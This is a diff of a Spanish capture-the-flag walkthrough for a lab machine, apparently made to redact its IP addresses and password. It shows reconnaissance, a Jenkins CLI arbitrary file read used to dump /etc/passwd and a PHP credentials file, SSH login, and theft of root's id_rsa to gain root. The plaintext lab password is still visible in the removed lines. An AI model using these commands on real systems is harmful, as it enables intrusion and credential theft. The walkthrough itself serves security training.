@@ -6,11 +6,11 @@
 arp-scan -I eth0 --localnet 
 ```
 ```
-•192.168.200.25
+•(IP-Victima)
 ```
 
 ```bash
-nmap -p 80,8080 -sS -sC -sV  -n -Pn 192.168.200.25 -oN nmap 
+nmap -p 80,8080 -sS -sC -sV  -n -Pn (IP-Victima) -oN nmap 
 ```
 ```
 •80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
@@ -23,18 +23,18 @@ Puerto 8008 contiene un jenkins
 ### Fuzzing:
 
 ```bash
-wfuzz --hc=404 -u http://192.168.200.25:8080/FUZZ -w /usr/share/dirb/wordlists/big.txt
+wfuzz --hc=404 -u http://(IP-Victima):8080/FUZZ -w /usr/share/dirb/wordlists/big.txt
 ```
 ```
 •about
 ```
 
-Tenemos un login en `http://192.168.200.25:8080/loginError`
+Tenemos un login en `http://(IP-Victima):8080/loginError`
 
 ### Identificación del sistema:
 
 ```bash
-whatweb http://192.168.200.25:8080  
+whatweb http://(IP-Victima):8080  
 ```
 ```
 •Jenkins[2.401.2] 
@@ -44,7 +44,7 @@ whatweb http://192.168.200.25:8080
 ### Descubrimiento de directorios:
 
 ```bash
-gobuster dir -u http://192.168.200.25 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x .php 
+gobuster dir -u http://(IP-Victima) -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x .php 
 ```
 ```
 •/connect.php
@@ -56,30 +56,30 @@ Buscamos exploits/CVE relacionados a Jenkins 2.401.2 y encontramos el CVE-2024-2
 
 Descargamos el archivo necesario:
 ```bash
-wget http://192.168.200.25:8080/jnlpJars/jenkins-cli.jar
+wget http://(IP-Victima):8080/jnlpJars/jenkins-cli.jar
 ```
 
 Para leer archivos internos:
 
 ```bash
-java -jar jenkins-cli.jar -s http://192.168.200.25:8080/ -http connect-node "@/etc/passwd"
+java -jar jenkins-cli.jar -s http://(IP-Victima):8080/ -http connect-node "@/etc/passwd"
 ```
 
 Luego, leemos el archivo `connect.php`:
 ```bash
-java -jar jenkins-cli.jar -s http://192.168.200.25:8080/ -http connect-node "@/var/www/html/connect.php"
+java -jar jenkins-cli.jar -s http://(IP-Victima):8080/ -http connect-node "@/var/www/html/connect.php"
 ```
 
 El código PHP obtenido valida un usuario y contraseña:
 ```php
 $username = "george";
-$password = "g30rg3_L3@k3D";
+$password = "g***********D";
 ```
 
 ### Acceso a SSH:
 
 ```bash
-nmap -6 fe80:0000:0000:0000:0a00:27ff:fefb:cb4e%etch0
+nmap -6 fe80(IPv6-Victima)%etch0
 ```
 ```
 •22/tcp   open  tcpwrapped
@@ -88,8 +88,8 @@ nmap -6 fe80:0000:0000:0000:0a00:27ff:fefb:cb4e%etch0
 
 Accedemos:
 ```bash
-ssh -6 george@fe80:0000:0000:0000:0a00:27ff:fefb:cb4e%eth0
-Pass: g30rg3_L3@k3D
+ssh -6 george@fe80:(IPv6-Victima)%eth0
+Pass: g*********D
 ```
 
 ### Escalada de privilegios:
@@ -129,14 +129,14 @@ python3 -m http.server 5000
 ```
 Accedemos vía navegador a:
 ```
-http://192.168.200.25:5000
+http://(IP-Victima):5000
 ```
 
 Copiamos y guardamos el archivo `id_rsa`.
 
 ```bash
 chmod 600 id_rsa
-ssh -6 -i id_rsa root@fe80:0000:0000:0000:0a00:27ff:fefb:cb4e%eth0
+ssh -6 -i id_rsa root@fe80:(IPv6-Victima)%eth0
 ```
 
 ¡Ahora estamos dentro como root! :D
